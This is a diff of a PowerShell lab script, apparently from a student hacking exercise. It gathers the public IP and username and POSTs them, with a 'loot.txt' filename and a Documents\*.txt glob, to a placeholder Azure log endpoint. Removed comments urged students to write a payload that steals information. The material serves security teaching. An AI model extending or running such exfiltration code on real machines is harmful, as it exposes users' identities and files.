@@ -1,17 +1,23 @@
-## This should be your Azure URL NOT mine
-$serviceUrl = "student-lab-kpb6gwwmdimnw.azurewebsites.net/log"
+## Replace this with your Azure Web App URL.
+$serviceUrl = "https://<your-student-lab>.azurewebsites.net/log"
 
-# This payload DOES NOT steal information
-# Create one that does.
+# Required payload fields:
+# - student_id
+# - hacker_handle
+# - filename
+# - public_ip
+# - data (PowerShell glob / capture string)
 
-# Get-LocalUser is a fun one
-# Use whatever LLM you want
+$publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org" -UseBasicParsing).Trim()
+
 $payload = @{
-    newlinetest = "HTML newline <br>This is better <br>NO SCROLLING FOR YOU"
-    user = $Env:USERNAME
-    lab     = "Adding more details. "
+    student_id = "STU-001"
+    hacker_handle = "neo"
+    filename = "loot.txt"
+    public_ip = $publicIp
+    data = "C:\Users\$env:USERNAME\Documents\*.txt"
 }
 
-$response = Invoke-RestMethod -Uri $serviceUrl -Method POST -Body ($payload | ConvertTo-Json) -ContentType "application/json"
+$response = Invoke-RestMethod -Uri $serviceUrl -Method POST -Body ($payload | ConvertTo-Json -Compress) -ContentType "application/json"
 
 $response
